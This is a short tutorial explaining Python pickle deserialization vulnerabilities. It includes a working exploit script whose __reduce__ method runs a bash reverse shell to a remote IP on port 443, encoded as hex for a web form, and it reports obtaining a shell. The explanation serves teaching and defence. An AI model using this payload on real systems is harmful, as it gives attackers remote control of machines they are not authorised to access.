A **Pickle Deserialization Attack (DES-Pickle)** is a type of vulnerability that can occur in *Python* applications that use the *Pickle* library to serialize and deserialize objects.

The vulnerability occurs when an attacker is able to control the Pickle input that is passed to a deserialization function in the application. If the application code does not properly validate the Pickle input, it can allow an attacker to inject malicious code into the deserialized object.

Once the object has been deserialized, malicious code can be executed in the context of the application, which can allow the attacker to take control of the system, access sensitive data, or even execute remote code.

Attackers can exploit DES-Pickle vulnerabilities to perform denial-of-service (DoS) attacks, inject malicious code, or even take complete control of the system.

The impact of a Pickle Deserialization Attack depends on the type and sensitivity of the data that can be obtained, but can be very serious. Therefore, it is important for Python application developers to properly validate and filter the Pickle input that is passed to deserialization functions, and to use security techniques such as resource limiting to prevent DoS attacks and disabling automatic deserialization of untrusted objects.

# Example

Let's imagine that we have an input in a web page and we know that *Python* is running behind it. We can try to see if the *Pickle* library is being used and try to perform a code injection in the *deserialization* process:

```python
#!/usr/bin/python3

import pickle
import os
import binascii
from typing import Any

class Exploit(object):
	# reduce is a system-level call that executes the command we pass to it
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.111.45/443 0>&1"',))

if __name__ == '__main__':
	# pickle.dumps shows all serialized data
    print(binascii.hexlify(pickle.dumps(Exploit())))
```

In the previous example we have returned the data converted to *hexadecimal* because the input code required that the data be passed in hexadecimal.

In this way we have managed to obtain a *reverse shell*.

This was possible because the user input is trusted and there is no sanitization.